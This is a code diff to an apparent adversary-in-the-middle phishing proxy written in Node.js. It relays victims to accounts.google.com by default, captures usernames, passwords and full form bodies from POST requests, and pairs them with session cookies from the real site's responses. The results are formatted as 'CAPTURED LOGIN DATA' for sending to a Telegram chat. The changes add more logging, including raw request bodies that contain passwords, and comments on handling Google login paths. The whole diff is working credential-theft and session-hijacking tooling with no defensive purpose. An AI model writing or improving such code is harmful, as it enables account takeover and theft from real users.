@@ -13,6 +13,10 @@ const TelegramBot = require('node-telegram-bot-api');
 // 2. Configuration from Environment Variables
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+// --- IMPORTANT: For Google, the exact target can matter.
+// --- If /health is hit, it won't be the login page.
+// --- If you are proxying to Google, the login form might submit to a path.
+// --- For now, we'll keep the main target, but specific path issues might arise.
 const TARGET_WEBSITE = process.env.TARGET_WEBSITE || 'https://accounts.google.com'; // Default if not set
 
 // --- Essential Checks ---
@@ -37,8 +41,14 @@ app.use(express.json({ limit: '10mb' }));
 // 5. Middleware to Capture Request Data
 // This middleware should run for *all* incoming requests that match its conditions.
 const captureRequestData = (req, res, next) => {
-  // Only capture POST requests with potential login fields
+  console.log(`[INFO] Incoming request: ${req.method} ${req.originalUrl} from IP: ${req.ip}`); // Log all incoming requests
   if (req.method === 'POST' && req.body) {
+    console.log(`[INFO] POST request with body. Checking for login fields. IP: ${req.ip}`);
+    // Log the full body for debugging if it's not too sensitive in logs, or if you redact sensitive fields.
+    // Be cautious logging passwords directly if logs are not secure.
+    // For now, we'll log the body content as it is.
+    console.log(`[DEBUG] Request body: ${JSON.stringify(req.body)}`);
+
     // Check for common login field names
     if (req.body.username || req.body.email || req.body.user || req.body.password) {
       console.log(`[+] Capturing potential login data from IP: ${req.ip}`);
@@ -47,7 +57,12 @@ const captureRequestData = (req, res, next) => {
         password: req.body.password || 'NOT_FOUND',
         allFormData: req.body // Capture the entire body for debugging
       });
+      console.log(`[INFO] Captured data for IP ${req.ip}. Data stored.`);
+    } else {
+      console.log(`[INFO] POST request body did not contain typical login fields. IP: ${req.ip}`);
     }
+  } else if (req.method === 'POST') {
+      console.log(`[INFO] POST request with no body. IP: ${req.ip}`);
   }
   // IMPORTANT: Always call next() to pass control to the next middleware/route
   next();
@@ -73,6 +88,7 @@ const proxy = createProxyMiddleware({
       body = Buffer.concat(body); // Keep as Buffer for binary data and correct content type handling
 
       const setCookieHeader = proxyRes.headers['set-cookie']; // Get cookies
+      console.log(`[DEBUG] onProxyRes: IP ${req.ip}, URL ${req.originalUrl}, Status ${proxyRes.statusCode}, Cookies: ${!!setCookieHeader}`); // Log cookie presence
 
       // Check if we captured data for this IP AND if the response contains cookies
       // The presence of cookies often indicates a successful login/session establishment.
@@ -85,6 +101,7 @@ const proxy = createProxyMiddleware({
 --- CAPTURED LOGIN DATA ---
 Target: ${TARGET_WEBSITE}
 IP Address: ${req.ip}
+Request URL: ${req.originalUrl}
 Username: ${loginInfo.username}
 Password: ${loginInfo.password}
 --- SESSION COOKIES ---
@@ -106,6 +123,8 @@ ${JSON.stringify(loginInfo.allFormData, null, 2)}
         // Optional: Log if no data was sent for some reason
         if (capturedData.has(req.ip)) {
              console.log(`[INFO] Captured data for IP ${req.ip}, but no 'set-cookie' header found or target not a login page. Data not sent.`);
+        } else {
+             console.log(`[INFO] No captured data found for IP ${req.ip}.`); // Log if data wasn't even captured
         }
       }
 
@@ -114,9 +133,6 @@ ${JSON.stringify(loginInfo.allFormData, null, 2)}
 
       // Remove headers that might force a download, like 'content-disposition'
       delete originalHeaders['content-disposition'];
-      // Ensure Content-Type is not forcing download if it's an HTML page
-      // (This might be more complex if the target sends truly binary files,
-      // but for login pages, it's usually fine to let the browser handle standard content types)
 
       // Set the response headers for the client
       // Use writeHead to set status code and headers before sending body
